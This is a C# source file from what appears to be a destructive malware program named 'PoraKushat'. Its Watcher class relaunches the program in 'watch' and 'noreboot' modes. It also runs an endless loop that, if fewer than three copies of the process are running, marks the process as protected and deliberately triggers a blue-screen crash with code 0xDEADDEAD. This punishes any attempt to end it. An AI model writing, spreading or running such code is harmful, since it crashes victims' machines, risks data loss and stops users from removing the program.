using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

namespace PoraKushat
{
    class Watcher
    {
        public static void Watch()
        {
            string name = Process.GetCurrentProcess().MainModule.ModuleName.Substring(0, Process.GetCurrentProcess().MainModule.ModuleName.Length - 4);

            while (true)
            {
                if (Process.GetProcessesByName(name).Length < 3)
                {
                    ProcessProtection.Protect();
                    BSoD.Kill(0xDEADDEAD);
                }
            }
        }

        public static void StartWatcherProcess()
        {
            ProcessStartInfo SelfProc = new ProcessStartInfo
            {
                UseShellExecute = false,
                WorkingDirectory = Environment.CurrentDirectory,
                FileName = Process.GetCurrentProcess().MainModule.FileName,
                Arguments = "watch"
            };
            Process.Start(SelfProc);
        }

        public static void StartNoRebootProcess()
        {
            ProcessStartInfo SelfProc = new ProcessStartInfo
            {
                UseShellExecute = false,
                WorkingDirectory = Environment.CurrentDirectory,
                FileName = Process.GetCurrentProcess().MainModule.FileName,
                Arguments = "noreboot"
            };
            Process.Start(SelfProc);
        }
    }
}